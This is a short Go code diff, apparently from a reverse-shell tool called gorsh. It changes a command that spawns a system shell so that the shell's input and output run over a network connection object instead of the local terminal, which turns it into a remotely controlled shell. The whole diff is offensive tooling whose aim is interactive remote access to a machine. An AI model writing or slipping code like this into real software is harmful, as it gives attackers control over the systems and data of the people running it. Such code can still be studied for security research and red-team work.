@@ -1,17 +1,17 @@
 package cmds
 
 import (
-	"os"
-
 	"github.com/abiosoft/ishell"
+	"github.com/audibleblink/gorsh/internal/myconn"
 	"github.com/audibleblink/gorsh/internal/shell"
 )
 
 func Shell(c *ishell.Context) {
 	cmd := shell.GetShell()
-	cmd.Stdout = os.Stdout
-	cmd.Stderr = os.Stderr
-	cmd.Stdin = os.Stdin
+
+	cmd.Stdout = myconn.Conn
+	cmd.Stderr = myconn.Conn
+	cmd.Stdin = myconn.Conn
 	cmd.Run()
 }
 
